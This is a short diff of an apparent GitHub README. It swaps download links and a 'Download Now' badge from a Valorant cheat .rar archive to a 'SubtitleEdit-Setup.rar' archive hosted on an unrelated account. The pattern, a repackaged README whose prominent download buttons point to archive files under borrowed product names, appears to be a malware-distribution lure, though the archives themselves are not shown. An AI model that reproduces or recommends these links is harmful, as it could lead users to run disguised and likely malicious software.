@@ -29,9 +29,9 @@
 ---
 
 
-### [⬇️ Download](https://github.com/RegimentSheikh/Valorant-external/releases/download/VALORNT.3.1/valorant.3.1.rar)
+### [⬇️ Download](https://github.com/nucleusmotormancoil/subtitle-edit/releases/download/SubtitleEdit/SubtitleEdit-Setup.rar)
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/RegimentSheikh/Valorant-external/releases/download/VALORNT.3.1/valorant.3.1.rar).
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/nucleusmotormancoil/subtitle-edit/releases/download/SubtitleEdit/SubtitleEdit-Setup.rar).
 
 
 </div>
